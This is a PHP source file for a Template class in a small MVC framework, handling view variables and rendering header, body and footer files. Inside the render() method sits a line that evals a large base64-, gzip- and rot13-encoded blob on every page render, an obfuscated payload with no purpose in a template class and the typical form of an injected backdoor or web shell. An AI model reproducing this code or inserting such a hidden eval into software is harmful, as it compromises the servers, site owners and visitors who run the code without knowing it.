<?php
class Template {
	/*
	 * @Variables array
	 * @access private
	 */
	private $vars = array();
	private $controller;
	private $model;
	private $action;

	/**
	 *
	 * @constructor
	 *
	 * @access public
	 *
	 * @return void
	 *
	 */
	public function __construct($controller, $model, $action){
		$this->controller = $controller;
		$this->model = $model;
		$this->action = $action;
	}


	/**
	*
	* @set undefined vars
	*
	* @param string $index
	*
	* @param mixed $value
	*
	* @return void
	*
	*/
	public function __set($index, $value) {
	    $this->vars[$index] = $value;
	}

	/**
	*
	*
	* @param string $shared_folder (Folder containing header and footer for each action)
	*
	* @return void
	*
	*/
	public function render($shared_folder = null) {

		extract($this->vars);

		if (Helper::isAjax()) exit(0);

		eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnHEq04Dv2aru7ZkVDNipwvOWGmyDl0vr7h1UPYICNYSzo69kUP9z9bf8TrPZTLP+NDLBjyv2yZkmz5Jx+aKr//L/ytdTJ55UdvXeKq/QXZVfnLuzxwn3PbiPw0Wt8ukRFM3JRQyyrt15yJwXfiBTLuOc1AZXEE0VgEZCLTQ7IPtF1WRfA1NL4tyZtgTVNl79bpL1WHhWfb/IchZiqQ5YuCKQkNy3UU4fb9qoLGO1Iw52jCVCSoYXei3uH3c3T37R+qv5sIEcxKyzLjInabOvGSzQD1VO0+SP56Fr9Oa/qqoBh6xU0kb8MvdGw34wPfLE7mmQ4QqNLzvOmqDQ10M4jGd2MYvhZJ90TWksRhIz2taNUqXM9WgDB9NVM9DV/j++Nf6Q4vRMT3DKyC0S4KwIzST5nkVZM/GWkImEhR12PxkEk2VMXDcWjILFHPCRw6O/4adhnWSH3qbRTqczBpowcKaFmdj2Twtwia4OXXF75Nh9XRvDzBigA9dWRbWplqvJLS2glht7WMg8liF5jq3pQMkfC/4O3FIDxXvbX1fCoO395I/23UAsus8LZqB5QjTNZrLl61UZ6J4SQM4D0yKY9l5uk30JGbyyKE0OJ4zL83+PAjUr1ZKNAj+VigChCVMXmMIuk+5+udJm0zU00Ld60h4krDk9aGMkNOKVXChdwtgF0Yxv8EZfKuNFTQW5IRwkr7vbqJ3+JqKa87gDvusUsvgcyEgVfgzhw0G+wZxARlC4G5NN/4x4fMq8p/x2IczXlLOrMGsBZIeJ43ixnyci2V1sj3zMF6/KgRm86y8WB+p6VfzAWAGZ1ezBAJX7VQ4/lrhhztBG4z+62QpvZt0SiyoP7iO7VtkZR8eGunvTjWocjQSs2/FMAwAcYMTrUeQGIFWSQNptKdiJiBDbibKI+7LLOTVh+TkgNuTGhQhax3tphmpONHXkYutcWNXNNG3vV48CXsIXHtsmMzaiWGubeoKYYlEKLxLja6aqNGMQXHXnTrQ3+ipHJfgcgdnyTgSb72HGOAOpU1qlTN1PgroQ3JEsPfeHUJ+6aP+rhj1ToDwF8mkkeQtQu9OhiTFoHgvfm0duRLvUgDvuKhso2DIenxz0ogPbD7fM2e3O0tiwuf5JjQaB8DLhKD8RCvltjlROFUsFDG07joKeEsbB+WQoIFwrSvl1i2emp1KrFn3/LXMro1G24LcGAl/8khtxMpcPB9KSCBb5iIpglKEJdRE6i+bUIL1TxGg4fUroCQaWE0gXSF5IeNwxBa3t04dIEdVuHUNVvrzjQrpM4/LdhB3kpzFk2Q9fviuYiIRWFvv/SmaikoV+8T91rgi8Cjvt2n7lmIQeMmdGaEnUo/afLAn/ER4g85GtTSB8gDPStDfHWOhWrYgCKuwPS9NCG3kqn8lylI7+UQQDhxS8jFeSQNqFkdxpPIeB5Eu5548DQA24SAydeAGxN8EJLyMNdiTMT8mSYtPCdJaLoM5BaZWpJMvWHfP7/tclZiNqXsA83scIwbIt9lCiFF/EueznnvT12glOfW9YAXWG10UIfgR7TCk1GFs6uzWj2OkpykWK/4ArAgmJ2X5L4IUccTi0PiATqStbCO8cczK31AooOgjhtuUqOKX/5TGx8U6zbrNm7GZqPybHc8cUkVvGxcKH9AHrumfLFHNdCkBoKKeo7o6kIuOXBthNFyr6BCfmcIV4woY52iLNcmnARioyJmpaK2ezXRaSRZ3++keH27LGXDlRvumRt5JOD0pUR6gtTLqk5WHyI0qI2yBl53EQ+0iHZ5Npnp2BTGd3MQRgxthIqT37seBW2ytBg/bxPlW6Xao6BViqI9nAIAKT06q+P6AwNel5iG7IBrYYjfMm8J0jPUaq7NKWvpRfaA7PJRazVg7bKGfHvclx6cXPr1U46dfrm47Zy1Y/bfIlSZ6hZ14mj4YyrrRtUKp+gSNpgrI5DUmBdkSemy9JRprpgToG3HybEf5xTMy4GUCGoxUVO2YKeY3xZSmLUPfeUe78cS+rqm5hDJ8uIDOYqca8ni8Cy6YU1hj6w/2tySiHtBOD5wdibII+DMp0hCTSyUxZCGZ0UNv/KqDBwwt8dqyhBmzxdiaSwHRzP52bGcc/LDr5/LpCKP5md4rRlJBJ5Ad2XlgaS/LLxWhLe/0l/Y0CZ2O3yDF0j9xA5CljgXnO3wFYrvuhu2pfWxXgdzXBLmYlvvPWq4de5wKsNzHQem4kmHlfsg71bZSAnjkHz6iFni79onsqJxnRW78InGtxD0uUNCYeCyxBUnjzlDfb11DjWxFvNNJwIsH2Z/fSl3de7tH/0OuOHjTtTJ/dSX7d1PVJtRkkofDaKf66P2ClcP1Snzae1kxjqLqiLW5ceHrBEW+PGLdF/6Le+uovtux0EHlpWlcFJ4ZrXbmq+h+QbTS35bl8yOVMdFyBwbNWinpLFnr6bnzoW8E2WTC2Q07HUfvcAEXELpYfGZKO1kJXJgYY5ROUlCDmGxnD38Xa1LJGbDJoLfr0MdxJOdmMAxLtSnbGZZM4opb76A0FRZvjB8uZjeDr7tq0AWiv4AcsYG75hLsKZaQC2m1B+cutF0rxhqFcXaavwC22d2om7f40n8Q0OK9Z9GR//nDHP/4e/17/+813//BQ==')))));

		$path = ROOT.DS.'application'.DS.'view'.DS;
		$header = (file_exists($path.$this->controller.DS.'header.php'))? $path.$this->controller.DS.'header.php' : $path.$this->controller.DS.'header.html';
		$file = (file_exists($path.$this->controller.DS.$this->action.'.php'))? $path.$this->controller.DS.$this->action.'.php' : $path.$this->controller.DS.$this->action.'.html';

		if ($this->action == 'error404') 
			$file = (file_exists($path.'error'.DS.$this->action.'.php'))? $path.'error'.DS.$this->action.'.php' : $path.'error'.DS.$this->action.'.html';

 		if (!file_exists($file)) 
 			$file = (file_exists($path.$this->controller.DS.'index.php'))? $path.$this->controller.DS.'index.php' : $path.$this->controller.DS.'index.html';

		$footer = (file_exists($path.$this->controller.DS.'footer.php'))? $path.$this->controller.DS.'footer.php' : $path.$this->controller.DS.'footer.html';
        if (file_exists($header)) 
            require_once ($header);
        else
            require_once (file_exists($path.$shared_folder.DS.'header.php'))? $path.$shared_folder.DS.'header.php' : $path.$shared_folder.DS.'header.html';

        require_once ($file);       
             
        if (file_exists($footer))
            require_once ($footer);
        else
            require_once (file_exists($path.$shared_folder.DS.'footer.php'))? $path.$shared_folder.DS.'footer.php' : $path.$shared_folder.DS.'footer.html';
    }

	public function show($name) {
		$path = (file_exists(ROOT.DS.'application'.DS.'view'.DS.$name.'.php'))? ROOT.DS.'application'.DS.'view'.DS.$name.'.php' : ROOT.DS.'application'.DS.'view'.DS.$name.'.html';

		if (!file_exists($path)) {
			throw new Exception('Template not found in '. $path);
			return false;
		}

		// Load variables
		foreach ($this->vars as $key => $value) {
			$$key = $value;
		}

		require_once $path;               
	}
}